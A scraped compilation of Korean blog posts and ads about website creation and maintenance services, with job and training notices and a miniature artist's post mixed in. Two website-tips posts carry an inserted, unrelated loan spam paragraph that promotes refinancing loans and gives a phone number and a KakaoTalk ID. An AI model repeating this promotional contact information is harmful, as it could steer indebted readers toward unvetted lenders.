필요한 프로그래밍부터 시작하여 홈페이지 실질적인 정보라 할 수 있는 사진과 영상 제작, 홈페이지 UX/UI 디자인, 홈페이지수정 관리, 홈페이지 홍보 등을 모두 말이죠. 홈페이지 작업 같은 경우 다루어야 하는 분야들이 너무 많다 보니 일부 작업은 다른 업체를 통해 협업으로 해결하는 편이지만 저희는 모든 것을 저희 스스로 기획하고 제작, 관리하고 있습니다.​​​  ​홈페이지를 작업하고 난 뒤  여러 가지 무료 혜택들도 받으실 수 있는데요. 홈페이지의 주소와 터를 잡아주는데 필요한 웹호스팅과 도메인을 1년 동안 무료로 지원해드리고 네이버 검색등록과 서비스 팝업, 서비스 명함 등을 저희가 제작해드립니다. 모두 웹사이트 개발 이후 당연하게 하고 관리해야 하는 부분들로 저희는 매우 실질적인 부분들을 서비스로 제공해드리고 있습니다.​​​   ​홈페이지수정과 같은 관리도 관리지만 홈페이지에 대한 편의성도 역시나 빠질 수 없겠죠. 지금 이 글을 보고 계시는 여러분들은 어떤 화면으로 보고 계시나요? 모바일 화면으로 보고 계시는 분들도 있으실 테고 집에서 모니터로 보고 계시는 분들고 계시겠죠. 카페에서 태블릿 화면으로 보고 계실 수도 있고요. 이와 같이 현재는 다양한 장소에서 인터넷을 할 수 있고 그런 환경이 잘 마련되어 있습니다. 문제라고 한다면 홈페이지는 이렇게 다른 환경에서 각자 다른 규격으로 화면에 구현이 된다는 거죠.​​​  ​일반적인 PC 화면의 규격에 맞게 제작된 홈페이지는 PC에서는 문제없이 구현되나 모바일이나 태블릿 등의 화면에는 규격이 맞지 않아 이미지가 너무 작게 보이는 등의 직접적인 문제가 발생합니다. 반응형 웹으로 제작을 하게 되면 이러한 규격에 의한 문제를 자연스럽게 해결할 수 있는데요.​​​  ​반응형 웹으로 개발된 홈페이지는 다양한 디스플레이에 자동으로 화면 크기를 맞추어 구현을 해줍니다.  반응형으로 제작만 하면 모바일 홈페이지 따로 pc 홈페이지 따로 할 필요가 전혀 없어지죠. 홈페이지수정,관리도 더욱 편리하게 하실 수 있습니다.​​​  ​HL스토리는 홈페이지수정과 제작, 홍보 등 모든 작업에 있어 언제나 합리적인 가격을 고수하고 있습니다. 언급하였듯이 모든 작업을 저희는 하청 등을 사용하지 않고 회사 내에서 해결할 수 있는 기술과 제작 환경이 모두 갖추어져 있는데요. 제작과 관리, 홍보에 있어서 거품이 없고 있는 그대로의 가격으로 만나보실 수 있습니다.​​​  ​홈페이지에 대한 모든 작업을 의뢰자가 바로바로 확인하고 의견을 낼 수 있도록 1:1 전담 유지보수 시스템이 제대로 갖추어져 있는데요. 1:1로 담당자를 배치하고 있습니다. 작업을 비롯하여 관리, 홍보 모든 작업을 이메일이나. 전화, 카톡 등으로 요청을 하시면 바로 답변드리고 처리해드립니다.​​​   ​홈페이지 관리에 해당하는 유지 보수는 두 가지 상품으로 만나보실 수 있습니다. 기본적인 이미지수정부터 인터넷 환경에 맞게 매우 불안정한 홈페이지를 데이터 백업과 트래픽 리셋으로 안정화 시키는 등 매우 저렴한 가격으로 체계적인 홈페이지 관리를 받아보실 수 있어요!​​​  ​홈페이지를 처음부터 제작하고 홈페이지를 관리하고 홍보를 하는 작업들은 각 작업마다 따로 전문 업체가 존재할 정도로 매우 중요한 부분들입니다. HL 스토리는 이 모든 것을 회사의 자체적인 환경과 기술력으로 해결하고 있어 언제나 합리적인 가격으로 최상의 퀄리티를 받아보실 수 있습니다.​HL스토리의 홈페이지 작업이 궁금하시다면 아래의 홈페이지를 한번 방문하셔서 참고하시거나 아래의 전화로 언제든지 문의하세요!​홈페이지 바로 가기 클릭전화상담 바로 가기 클릭1588-1815 네이버 블로그는 맞지만, 확인불가홈페이지 제작업체 선택이 어렵지요?아래글 참고하시면 도움이 되실겁니다.홈페이지뚝딱(플러스넷 & 웹디자인팜)완전 지저분한 내 책상 작년인가...타 홈페이지 제작 업체직원을 만났는데, 그 회사에서는 7천짜리 홈페이지가 지금까지 만든 홈페이지 중에서 가장 저렴한 홈페이지라고 했습니다. 그런데 요즘 검색을 해보면 10만원짜리? 무료? 알고보면 말장난이지만 그래도 초저가형 홈페이지도 많이 있습니다. ​겉보기는 비슷해 보이는데 무슨 가격차이가 이렇게 나지? ​ 깨끗한 조실장님 책상 엄청 비싼 홈페이지요?솔직히 수천만원 홈페이지 살펴보면 겉모습은 비슷해 보여도 웹표준 웹접근성 인증, 보안문제, 서버종류, 홈페이지에 내장된 기능들...비싼 이유가 있습니다. 작업기간, 투입된 인력의 인건비...비싸면 비싼만큼 대부분 잘 만든거 인정합니다. 그래도 그렇지..,천언마아넌~ 이건 너무 비싼거 아닌가요. 가끔 비싸기만 한 홈페이지도 있습니다. 그런거 보면 화나요.   ​초저가형 or 무료 홈페이지요?대부분 무료 공개형 프로그램에 디자인 입혀서 미리 만들어 놓고 복사해 주는 것입니다. 호스팅용량 초소형, 보안서버도 없고, 모바일 호환성은 완전 별로, 글자 하나 수정하려면 연락해서 몇일 기다려야하고, 자동화나 관리앱은 당연 없고요...말이 무료 또는 10만원이지 호스팅비용, 페이지 추가비용, 디자인 수정비용...이것저것 하다보면...그냥 여기까지만요. 아무튼 그 가격에 딱 맞는 홈페이지입니다. ​※ 어느 특정회사 지목하는 거 절대 아닙니다. 초저가형 홈페이지의 일반적인 특징을 말하는 것입니다. ※ 모르지요. 혹시 고가형 홈페이지를 10만원 또는 무료로 제공 하는 것일 수도 있고요. ​ 새로 들어온 공기청정기 확실한 인생 진리의 말씀."세상에 공짜는 없다."​누가 자기시간 투자하면서 공짜로 홈페이지를 만들어 주겠어요.조금 저렴하고 조금 비싼것은 있어도, 대부분 비싸면 비싼대로 싸면 싼대로 이유가 있습니다.그래서 업체선택에서 가장 중요한 것은 우리회사에 가장 적절하게 잘 맞는 업체선정입니다.​ 사무실 대형 공기청정기 그럼 우리회사는 어떤 회사에 의뢰를 해서 만들어야 할지 고민이 됩니다.​첫번째 고려할 사항​첫번째는 홈페이지에 어떤 기능들이 필요한가? 확인해 보는 것입니다.홈페이지는 단순하게 어떤일을 하고 있는지 알리는 목적의 홍보형 홈페이지가 있고다양한 기능이 필요한 기능성 홈페이지가 있습니다. ​기능성 홈페이지의 예) 심사프로그램 사이트, 온라인시험 사이트, 동영상서비스사이트, 예약사이트, 경매사이트, 구인구직사이트, 오픈마켓사이트 등등등....​ 내 명함 뒷면 단순 회사홍보형 홈페이지라면​단순한 소개라면 10페이지 구성 100 이하로 만드시면 적당하게 만들었다고 할 수 있습니다. 구성페이지 수가 많으면 더 들어가겠지요.기본적으로 확인해야 하는 내용은 반응형 홈페이지 인지, 관리기능이 편리한지(가급적 자동화로 선택), 유지보수비는 얼마나 들어가는지, 관리앱은 제공되는지(있으면 매우 편리), 검색최적화는 되어있는지 정도는 확인해 보시는 것이 좋겠습니다. ​단순한 정보 전달만 필요한 홈페이지를 비싸게 만들 필요는 없습니다. ​ 나의 이어폰 자주 안씀 특별한 기능이 필요한 홈페이지라면​먼저 회사에서 원하는 완성된 프로그램 적용 홈페이지(웹솔루션)이 있는지 찾아봅니다.솔루션을 찾아봐야 하는 이유는 동일한 기능이라 해도 솔루션 구매와 새롭게 개발하는 것에는 비용적인 차이도 대략 10배 이상 나고, 개발의 경우 초기 오류도 너무 많습니다. 100만원이면 구매할 수 있는 솔루션을 굳이 1000만원 주고 개발할 필요는 없겠지요.​원하는 프로그램이 판매되지 않을 때, 맞춤 개발형 홈페이지 제작을 알아보시면 됩니다. ​ 홈페이지 뚝딱 블로그 홈페이지 제작업체는 특성이 있습니다.​- 완성된 디자인의 홈페이지를 복사 및 수정해 주는 업체- 기본 레이아웃을 바탕으로 필요한 부분만 맞춤 제작을 하는 업체 (저희는 이런 유형의 홈페이지 제작업체입니다.)- 맞춤 개발형 홈페이지를 제작하는 업체- 웹솔루션 전문 판매업체- 기타등등...​어떤 업체가 더 좋다고 말할 수는 없습니다.각 기업의 홈페이지 제작 예산과 홈페이지의 중요도에 따라 위에서 설명한 내용을 바탕으로 적절한 업체 선정을 하시면 됩니다.​각 업체마다 잘 맞는 홈페이지 제작업체가 있습니다.저희와 상담하셔도 저희는 더 좋은 업체 있으면 그쪽을 안내 드립니다.​홈페이지 관련 문의 사항 있으시면 부담없이 연락 주세요.제 개인 휴대폰은 010-3402-7119 입니다. ​​​ mini CANVASThe little world I draw​​​2020. 07. 01안녕하세요~ 미니어처화가. 몽이입니다.​작업을 하다보면 재료가 부족할때가 꼭 항상 나타납니다.. 그럼 흐름도 끊기고, 참 사러가기 싫어진답니다..​오늘은 작업보단 네이버 모두 홈페이지를 관리하였습니다. 그리고 잠깐 바람도 쐴겸 동아측기에 재료를 구매하기 위해 방문하였답니다.​​  [미니캔버스 - 홈]미니어처화가가 되어 그려내는 작은 세상을 표현해냅니다.minicanvas.modoo.at 네이버의 모두를 활용하여 미니캔버스의 홈페이지를 제작해 보았습니다.​일정안내나, 소식, 클래스 등 여러가지 안내할 것들을 올려보기 위해 정리해 보았습니다.​미니캔버스 홈페이지에 놀러와보세욤:-) 일하자 일!​​​  동아측기 애정하는 1인이지만, 홍보를 하는 것은 아닙니다.(오해 없으시길 바랍니다) 동아측기​ 구매한 재료뭐를 사왔을까요? 어떤 상품을 제작해 낼까요?​계속 관심 주시면 아실 수 있답니다!​​​  사진을 클릭하시면 미니캔버스의 인스타를 구경하실 수 있습니다.#미니캔버스#내가그려내는작은세상#미니어처화가#미니어처공방#미니어처제작#클래스#판매#운영#모두#홈페이지#동아측기#재료#구매#방문 혹시, 홈페이지를 만들긴 했는데.. 관리는 안하고 방치해 두고있나요?홈페이지는 회사의 얼굴이기에, 관리가 매우 중요합니다. 그동안 간단한 홈페이지 수정 어떻게 하셨습니까? 홈페이지 관리를 맡길 곳이 마땅치 않으셨나요?   기업을 평가할때 홈페이지를 먼저보는 시대입니다. 그런데, 공지사항은 3년전이 마지막이고, 연현은 5년전이 마지막으로 되어있지는 않나요?   홈페이지 관리비용이 정확히 책정되고 남은 돈은 적립까지 해드리는.. 국내 최초!!  홈페이지 유지보수 전문서비스 <홈큐어>​​​회사의 얼굴 더이상 방치하지 말고.. 홈큐어에서 치료받자!!!​www.homecure.co.kr 홈큐어www.homecure.co.kr ​​홈큐어는 쿤스의 또하나의 브랜드 입니다. www.koons.co.kr ♣ 당신이 원하던 꾼들 KOONS ♣ Not just creative! 기업 홈페이지제작,유지보수...www.koons.co.kr​Tel. 02.555.5166~7​​   ​​ 홈페이지관리업체 선정할 때 꼭 알아야 하는 3가지온라인으로 거의 모든 것을 할 수 있는 시대입니다. 홈페이지 안에서 우리는 기업의 정보를 파악하고, 필요한 물건을 주문하기도 하며, 공과금을 내고, 새로운 사람을 만나기도 합니다. 홈페이지의 역할은 갈수록 다양해지고 있으며 현실과도 직접 닿아 있습니다. 그렇기에 홈페이지를 잘 관리하고 운영하는 것은 많은 고객을 끌어 모을 수 있는 발판이기도 하며, 기회이기도 할 것입니다.​​   ​​그렇다면 홈페이지 관리를 잘 하는 것이란 무엇일까요? 가장 좋은 것은 홈페이지관리업체에 맡겨 유지 보수와 운영을 하게 하는 것 일 텐데요, 제작을 한 곳에서 함께 관리까지 해 준다면 더욱 유리하다 할 수 있겠습니다. ​​   ​​오랜 기간 문제없이 홈페이지를 관리하고 운영해 나가기 위해서는 업체 선정도 굉장히 중요합니다. 업체의 관리 문제로 홈페이지가 제대로 운영되지 않는다면 그보다 더 큰 손실이 없을 것이기 때문입니다. 홈페이지관리업체를 선정할 때는 우선 아래 3가지를 먼저 따져봐야 합니다. ​​   ​​1, 홈페이지 제작 및 관리 경험이 풍부한 곳인가? ​아무도 신입사원에게 회사 전체를 맡기는 일은 없겠죠? 홈페이지도 마찬가지입니다. 맡기려는 곳이 홈페이지 제작과 관리 면에서 풍부한 경험과 업적을 가지고 있는지 따져 보아야 하며, 최소 10년 이상 된 회사여야 안전하다 할 수 있겠습니다.​​   ​​제작과 관리에 있어 다양한 사례가 있어야 예상치 못한 일이 발생해도 바로 처리할 수 있으며, 체계적이고 전문적인 틀 안에서 관리를 받을 수 있게 됩니다. ​라이크웹은 15년의 경력을 가진 홈페이지관리업체로 고객사에서 원하는 스타일의 홈페이지, 운영 방법으로 맞춰 작업해 드릴 수 있습니다. ​​​   ​​2. 각 분야 전문 인력이 상주하는 곳인가? ​홈페이지를 제작하고 관리하는 데에는 웹기획자, 웹디자이너, 웹프로그래머가 있어야 합니다. 하지만 이런 인력이 내부 상주하지 않고 외부 하청을 두고 일하는 곳은 피하는 게 좋습니다. ​​   ​​자제 인원이라야 책임감을 가지고 홈페이지 관리를 할 수 있으며, 제작에 직접 참여했던 인원이기에 더욱 정확하게 일을 처리할 수 있을 것이기 때문입니다. ​라이크웹에는 각 분야별 우수한 전문 인력이 상주하고 있어 홈페이지관리업체로써의 퀄리티를 높이고 있습니다. 유지 보수 및 관리 능력도 체계적인 편으로 단골 고객사들이 많은 편입니다. ​​   ​​3. 자체 서버를 보유하여 웹호스팅이 가능한 곳인가? ​마지막으로, 자체 서버를 보유하여 웹호스팅이 가능한지를 따져봐야 합니다. 자제 서버가 없으면 웹호스팅 업체를 별도로 계약해야 하는데 이럴 경우 추가가 비용이 들어가게 되고, 보안상으로도 좋지 않기 때문입니다. ​​​   ​​라이크웹은 홈페이지 제작 후 서버 관리도 함께 해 드려 유지 보수 면에서 효율적일 뿐 아니라 관리비용도 절감할 수 있다는 장점이 있습니다.  홈페이지관리업체 선정 시 위 3가지를 유념하여 고른다면, 더욱 성공적인 홈페이지 운영을 하실 수 있을 것입니다. ​​   ​​​ 홈페이지제작 라이크웹서울 강남구 위치,서울홈페이지제작, 홈페이지제작, 반응형홈페이지제작,홈페이지제작업체, 기업홈페이지제작www.likeweb.co.kr ​​  ​ 홈페이지&SNS콘텐츠 제작 관리운영모집부문 및 상세내용공통 자격요건ㆍ학력 : 대졸 이상 (2,3년)ㆍ나이/성별 : 무관홈페이지&SNS콘텐츠 제작 관리운영 0명담당업무ㆍ홈페이지관리, SNS콘텐츠 제작 관리운영, 홍보마케팅지원자격ㆍ경력 : 무관 (신입도 지원 가능)근무조건ㆍ근무형태:정규직(수습기간)-3개월, 계약직(정규직 전환가능)-6개월ㆍ근무일시:주 5일(월~금) 오전 9시~오후 6시ㆍ급여:월급 220만원ㆍ근무지역:(42416) 대구 남구 중앙대로 211(대명동) - 대구 1호선 교대 에서 200m 이내전형절차서류전형1차면접최종합격접수기간 및 방법ㆍ접수기간:2021년 3월 23일 (화) 09시 ~ 2021년 4월 22일 (목) 24시ㆍ접수방법:사람인 입사지원ㆍ이력서양식:사람인 온라인 이력서유의사항ㆍ입사지원 서류에 허위사실이 발견될 경우, 채용확정 이후라도 채용이 취소될 수 있습니다. [(주)능력개발원 새일다밀] 홈페이지&SNS콘텐츠 제작 관리운영(D-30) - 사람인(주)능력개발원 새일다밀, 홈페이지&SNS콘텐츠 제작 관리운영, 경력:경력무관, 학력:대학졸업(2,3년)이상, 연봉: , 홈페이지:www.saramin.co.kr #대구, #대구취업, #취업, #취업공고, #스터디, #동영상촬영 ★ 여성가족부가 지원하는  경력단절여성의 실무역량 교육 ★성남여성인력개발센터는 경력단절여성 직업교육훈련으로 포토샵 디자인,  홈페이지 운영 및 관리, 온라인마케팅 등을 바탕으로실무역량을 갖춘 홈페이지 운영관리 사무원을 양성하고자 하오니 관련 분야로 취업 또는 창업을 희망하는 분들의 많은 참여 바랍니다!​​홈페이지 운영관리 사무원 양성과정접수마감 ~3월 22일 월요일​​■ 교육대상 : 성남시 인근지역 거주 미취업 여성으로 홈페이지 운영/관리 및 사무지원 분야로 취업을 희망하는 자​■ 교육내용 : 포토샵디자인, 홈페이지 및 쇼핑몰 구축 실습, 온라인 마케팅, 워드활용실무, 엑셀활용실무 등■ 교육일정 : 03.29~05.13/09:30~13:30/총33일 132시간​■ 교육방법 : 온라인 ZOOM 활용 실시간 교육 (1~2일 정도 대면수업 진행 예정)*준비사항 : 인터넷이 연결되는 PC(웹캠 필수) 또는 노트북 준비 필수​■ 교 육 비 : 자부담금 10만원 (수료/취업시 각5만원 환급)​■ 선발전형 : 서류접수(03.22,월)마감-면접전형-최종선발​■ 최종선발자에 한해 사후집단교육(3일) 실시함(추후일정 공지)​>>자세한 정보는 링크를 통해 확인하세요https://c11.kr/n2qm​ ​​​접수방법※이메일 또는 방문 접수 택 11)홈페이지 자료실의 수강신청서 작성 후 센터 이메일 지원성남여성인력개발센터: snw0502@daum.net​2)성남여성인력개발센터 방문 후 수강신청서 작성 후 제출경기도 성남시 수정구 위례광장로 KCC엘츠타워 3층​문의전화 031-718-6696(교육팀 내선번호 4번)​ 성남여성인력개발센터경기도 성남시 수정구 위례광장로 21-9 3층 ​  지식 축적 홈페이지제작및관리 올바르게 이해하는 홈페이지 백업   홈페이지제작및관리에 관한 정보를 알아 보고 계시나요?알짜 정보 어디 없나~ 궁금해 하셨을 거예요~홈페이지제작및관리에 관해 알아야 할 필수항목들, 꼭 알아야 할 정확한 정보들! 스마트해지는 정보들!속 시원하게 풀어보세요!    자신이 만든 홈페이지의 계정 공간 상에 어떤 파일들을 올린다는 것은, 내 개인컴퓨터에 저장되어 있던 파일을 웹 서버상에 보내 저장시키는 것을 말합니다.    보통 파일 등록 프로그램인 FTP를 이용하여 프로그램 창 좌측에 있는 폴더에 저장된특정 파일들을 더블클릭 해서 홈페이지 서버에 업로드할 수 있습니다.단, 모든 사이트에서 FTP 파일 등록 프로그램을 지원하는 것은 아니므로 먼저 서비스 가능여부를 확인해 보는 것이 좋은 방법이에요.그리고 홈페이지 관리할 때는 컨텐츠나 페이지를 부주의로 삭제했을 시를 대비해백업 작업이 필수이며 홈페이지를 확실히 백업해 두었다면 언제든지 원상복원이 가능하답니다.  또한 홈페이지가 해킹되어 트러블이 나타났을 경우 백업 파일을 불러와 복구가 가능하며, 따라서 사이트를 관리하신다면 백업은 반드시 주기적으로 진행해주시기 바랍니다.   홈페이지 제작 및 유지보수, 구석구석 확인해보세요!   최근 인터넷에서 무료 홈페이지 제작이라는 광고 문구를 자주 볼 수 있습니다. 이런 경우 초기 제작 견적을 무료로 진행하긴 하지만 가장 기본적인 디자인을 제공하기 때문에 결국에는 추가 비용으로 추가 옵션을 진행할 수 밖에 없습니다.    따라서 홈페이지 제작 업체를 선정할 경우엔 저렴한 비용을 우선시하기보다는 얼마나 고객이 원하는 바를 확실하게 숙지하고 제작해주려 하는지,유지 보수에 대해서 추가 비용 정책은 어떻게 되는지를 먼저 알아보셔야 해요.만약에 홈페이지 제작 업체와 계약을 할 예정이라면 초기 시안 작업 및 검수부터 이후 수정과 관리의 자세한 항목에 대하여 어떠한 조건으로 가격이 청구되는지 꼼꼼히 검토하고업체와 협의를 통한 계약 내용 수정 및 추가를 통해서 업체 계약을 진행하는 것이 가장 좋습니다.그리고 홈페이지를 처음으로 제작할 경우에는 제작 원본을 꼭 받아놔야 하는데요.디자인 원본을 제공하지 않을 수도 있으니 반드시 시안 작업 시작 전 미리 인지하시기 바라며,제작 원본이 있을 경우에는 이 후에 다른 업체를 통해서도 수정이 가능하답니다.  또한 대부분의 사람들은 홈페이지 제작 완료 후 발생되는 유지 비용으로 도메인 및호스팅 연장 비용만을 생각하는 일이 많은데 홈페이지 부분 수정 및 추가 혹은 삭제하는 경우에도 비용이 청구될 수 있으니 반드시 사전에 미리 검토하세요.   높은 이자율 때문에 원금 갚기도 어렵다면 저금리대환대출에 집중하세요!저금리대환대출은 20%가 넘는 높은 이자를 이용하거나상당히 많은 대출건수로 부채 관리가 어려운 분에게 적합합니다.조회이력이나 신용등급 변경 없이 상담 유효하며 어떤 수수료도 받지 않습니다. 대출이 필요한데 무엇을 해야 할지 모르겠다면010-6414-2119이나 akdrn7077 카카오톡으로 상담해보세요대출로 마음 힘드신 분들에게 큰 보탬이 됩니다.    오늘은 홈페이지제작및관리에 관해 알려드렸습니다.홈페이지제작및관리 확실하게 짚고 넘어가니 훨씬 좋지 않나요?    궁금하신 점이나 부가 정보가 필요하시다면    이웃추가를 해주세요~!^^  정보포털 <홈페이지제작및관리> 이제는 알아야 할 홈페이지 부가서비스에 대하여…   디즈니와 픽사 스튜디오가 합심해서 제작한 애니메이션 <벅스 라이프>를 보면 이같은 대사가 나와요.‘작은 씨앗엔 큰 나무가 될 수 있는 모든 것들이 들어 있단다. 단지 시간이 조금 필요할 뿐이야.’가능성과 희망이 작아 보일지라도 꾸준하게 노력한다면 큰 꿈을 이룰 수 있습니다.지금부터 차근차근 홈페이지제작및관리에 대한 정보를 공부하다 보면 전문가가 될 수도 있는 것처럼요!    기본적인 솔루션형 홈페이지의 경우, 저렴한 금액으로 제작할 수 있지만디자인이나 팝업창, 텍스트 수정이 어려울 수 있습니다.따라서 업체와 사이트의 특성에 맞게 맞춤 홈페이지 관리가 필요하거나지속적인 관리감독이 필요한 홈페이지의 경우, 맞춤형 서비스를 이용해 보는 것이 좋습니다.    그리고 로그분석에 사용되는 액세스로그는 업체의 홈페이지에 접속한 방문객들이 홈페이지를 돌아다니며 요청했던 파일들을 기록해 놓은 것인데 액세스로그의 자료를 분석하여  홈페이지에 들어온 고객들의 관심을 파악할 수도 있습니다.또한 부정클릭이란 광고비를 갑작스럽게 소진시키려는 악의적인 생각을 가지고 마구잡이로 클릭하는 것인데, 홈페이지 관리비가 많이 들어갈 수 있기 때문에 로그분석을 통해 확인하시는 것이 좋습니다.부정클릭 차단을 원한다면 네이버 계정 IP 차단 기능을 이용하는 것이 좋은데요. 네이버 계정에서 관리 도구 그리고 광고 노출 제한 관리를 통해 해당 IP에는 업체 홈페이지가 나타나지 않도록 조치합니다.이외에도 전자 결제서비스의 경우, 결제시스템을 사용해서 카드결제나 실시간 계좌이체 등을 빠르게 확인 할 수 있습니다.또한, 매출의 집계나 결제 내역을 관리할 수 있으므로 편리합니다.    내 삶에 더하기가 되어줄 홈페이지 제작 및 관리 대행업업체의 서비스 에 대한 정보    악성코드와 웹쉘을 삭제하여 유해한 프로그램으로부터 홈페이지를 보호해 주는 서비스는홈페이지 제작 및 관리 대행업체에서 하는 제일 대표적인 일입니다.그리고 홈페이지 제작 및 관리 대행 회사에서는 보안서버 인증서 설치를 대행해요.이를 통하여 만들어진 홈페이지의 보안을 강화하여 안전하게 유지한답니다.은행이나 기타 결제 서비스가 있는 홈페이지는 방화벽 등 보안서비스가 요구됩니다.홈페이지 제작 및 관리 대행업체에서는 보안존 서비스를 통하여 웹보안 서비스를 제공합니다.또한 홈페이지 빌더 서비스는 홈페이지를 변형하거나 관리할 때 쓰는 툴입니다.이는 홈페이지 제작 및 관리 대행업체에서 제일 대표적으로 제공하는 서비스에 들어갑니다.홈페이지 제작 및 관리 대행회사는 고품질의 디자인 템플릿을 이용해 홈페이지를 제작합니다.업종에 따라 어울리는 디자인으로 멋진 홈페이지를 제작하여 준답니다.    높은 이자율 때문에 원금 갚기도 힘들다면 저금리대환대출에 집중하세요!        저금리대환대출은 20%가 넘는 높은 이자를 이용하거나상당히 많은 대출건수로 부채 관리가 어려운 분에게 유용합니다.        조회이력이나 신용등급 변경 없이 상담 가능하며 어떤 수수료도 받지 않습니다.         대출이 절실한데 어떤걸 해야 할지 모르겠다면010-6414-2119이나 akdrn7077 카카오톡으로 연락해보세요대출로 마음 고생하시는 분들에게 큰 보탬이 됩니다.     생각보다 재미있는 홈페이지제작및관리에 대한 이야기, 어떠셨나요?역시 어떤 정보든 새롭게 배우는 것은 늘 유익하고 재미있는 것 같아요.이웃 여러분에게 알찬 정보 전해드린 것 같아 뿌듯합니다.다음 시간에 더욱 재미난 소식으로 찾아올게요~ ^^  ​홈페이지가 요즘에는 필수라는 것은 모두들 알고 있습니다. 인터넷을 기반으로 하는 사업은 두말할 것도 없고 기반을 하지 않는다고 하더라도 홈페이지를 모두들 만들고 있죠. 이것은 결국 소비자들의 달라진 패턴에 따라 바뀌고 있는 건데요. 이제 사람들은 모든 정보를 tv가 아닌 인터넷을 통해 습득하고 있기 때문입니다. 인터넷 의존도는 젊은 층일수록 절대적으로 높고 최근에 들어서는 중장년층들도 많이 늘어나고 있죠. 인터넷에서는 tv에서 볼 수 있었던 것들도 다 시청이 가능하고 더불어 다양한 서비스들도 가능하니 이는 어찌 보면 매우 당연한 겁니다. 그래서 홈페이지를 다들 만들고는 하지만 그 이후 정작 중요한 관리나 홍보에 대해서는 손을 놔버리는 경우가 많습니다. 홈페이지 관리에 대한 중요성을 모르고 무작정 제작만 하면 모든 것이 해결될 것이라 생각하시는 분들도 있지만 관리 자체가 정말 힘든 것도 있죠. 에이치엘스토리는 홈페이지관리는 물론이고 제작과 홍보를 모두 담당하고 있습니다.​​​  ​홈페이지관리 이전 저희는 제작 역시 확실하게 해드립니다. 제작에 필요한 모든 기술들을 저희는 보유하고 있습니다. 기획팀과 미디어팀, 홍보팀, 디자인팀과 같이 각 기술의 전문가들을 팀으로 꾸려 운영하고 있으며 제작에 필요한 촬영 장비나 촬영/편집팀, 자체적인 스튜디오도 보유하고 있죠. 저희는 모든 것을 자체적으로 만들어 낼 수 있고 이후의 홍보와 관리도 자체적으로 해결합니다. 이는 전체적인 서비스의 퀄리티를 더욱 올릴 수 있고 합리적인 가격으로도 이어지게 되죠.​​​  ​홈페이지 제작, 홈페이지 관리, 홍보 등 홈페이지를 만들고 이후까지 문제는 역시나 돈이라고 할 수 있습니다. 특히나 홈페이지 제작은 업체마다 너무나 다르죠. 처음 제작을 하시는 분들은 업체를 어디로 선정하느냐에 크게 고민하십니다. 그래서 어느 순간부터 저렴한 곳을 찾게 되는데 업체 선정 기준이 단순히 저렴한 것 하나로 맞추게 되면 이후의 관리, 홍보 등의 활동에 큰 걸림돌이 됩니다.  애초에 너무나 저렴한 가격은 홈페이지 퀄리티를 기대할 수 없고 너무나 저렴한 가격으로 제작한 곳은 가장 중요한 이후의 홍보와 관리는 담당하지 않기 때문이죠.​​​    ​저희는 모든 기술들과 환경이 갖추어진 만큼 최고의 퀄리티를 뽑아낼 수 있으며 프리랜서를 고용하거나 하청업체를 따로 사용하지 않습니다. 홈페이지 제작은 다양한 기술들이 필요하며 이 기술들을 모두 보유한 업체는 그렇게 많지 않습니다. 아무래도 부족한 부분은 외주를 통하여 해결하는 데 홈페이지는 다양한 기술들이 모여 하나를 만들어야 하는 작업입니다. 기획이라는 중심을 두고 그에 맞게 각 기술들의 균형을 잘 맞추어야 하죠. 외주를 활용하면 이러한 균형이 깨지기 쉽고 퀄리티에 영향을 줄 수밖에 없습니다. 저희는 자체적으로 해결하는 만큼 언제나 동일한 퀄리티와 합리적이고 거품을 걷어낸 가격으로 언제나 여러분들에게 제시해드립니다.​​​     ​모바일 시장에 맞게 저희는 홈페이지도 다양한 디스플레이 환경에 적용할 수 있도록 적응형, 반응형, 하이브리드형으로 제작해드립니다. 이제 한 가지의 홈페이지로 PC는 물론이고 모바일, 태블릿 등 더욱 효율적으로 홈페이지를 운영하실 수 있습니다.​​​  ​어찌 보면 가장 중요한 것은 역시나 홈페이지관리 입니다. 아무리 잘 만든 홈페이지라도 관리가 되지 않으면 가치가 없어지게 됩니다. 저희는 1:1 담당자를 여러분들에게 배정하고 있으며 회사의 카카오톡이나, 이메일, 전화 등으로 언제든지 담당자에게 수정요청 및 피드백을 주시면 빠르게 답변드리고 작업에 반영하고 있습니다. ​홍보는 빅데이터로 수집하고 분석한 키워드들을 기반으로 하여 홈페이지가 자연스럽게 검색 결과 상단에 뜰 수 있도록 상위 노출 방식으로 진행하고 있습니다.​​​  ​홈페이지는 제작, 홈페이지관리, 홍보 모든 3박자가 맞아야 됩니다.  처음 시작하시는 분들은 가장 기초 단계인 제작에만 집중하는 탓에 그 이후의 작업들을 등한시하여 실패하는 경우가 많습니다. 저희 에이치엘스토리는 이 모든 것들을 확실한 퀄리티로 운영하고 있으며 여러분들이 원하시는 결과를 보여드리고 만들어드립니다.​홈페이지 바로가기 클릭전화상담 바로가기 클릭1588-1815   ​홈페이지의 가치는 오늘날에 더욱 인정을 받고 있고 그 효과를 입증하고 있죠. 매번 바뀌고 변질되는 잘못된 정보들 속에서 믿음이라는 것을 주고 자체적인 서비스와 소비활동 모든 것을 아우르고 있으니까요. 그러다 보니 너도 나도 홈페이지를 만들려고 하지만 더 중요한 것을 잊고는 합니다. 홈페이지는 제작뿐만 아니라 그 이후 관리가 더 중요하다는 것을 말이죠. 에이치엘스토리는 홈페이지관리업체로서 제작과 홍보 모든 것을 담당하고 있습니다.​​​   ​홈페이지관리업체로서 저희는 제작에도 확실한 기획을 두고 진행합니다. 제작 기간 중 가장 많은 시간은 처음 단계인 기획에 할애를 합니다. 프로젝트의 처음이자 끝이며 뿌리와도 같은 기획이 제대로 되어야 그 이후의 본격적인 작업 역시 수월하게 진행되고 퀄리티 역시 만족스럽게 나올 수 있죠. 저희는 기획팀, 미디어팀, 디자인팀, 홍보팀과 같이 체계적으로 팀으로 구성하고 운영하고 있으며 컨셉과 테마를 확실하게 잡고 효율적인 마케팅과 정보 전달을 위해 끊임없이 회의하고 고치고 다져갑니다. ​​   ​저희는 각 분야의 전문가들을 보유하고 있으며 그들의 역량을 끌어낼 수 있도록 스튜디오와 촬영 장비 등의 제작 환경도 제대로 갖추고 있습니다. 당연하게도 들리실지 모르지만 저희처럼 이렇게 자체적으로 해결하는 업체는 그렇게 많지 않다는 것을 조금만 시간을 투자하고 찾아보시면 아실 겁니다. 제작에는 수많은 시간과 인력이 필요하며 그러한 조건이 마련되어 있지 않을 시에는 대부분 타 업체에게 하청을 맡기는 일이 많습니다. 그러다 보니 자연스럽게 제작비가 오르게 되고 그 부담은 여러분들에게 돌아가게 되죠. 에이치엘스토리는 모든 것을 스스로 기획하고 제작, 관리, 홍보를 하고 있기에 이러한 거품이 없고 합리적인 가격으로 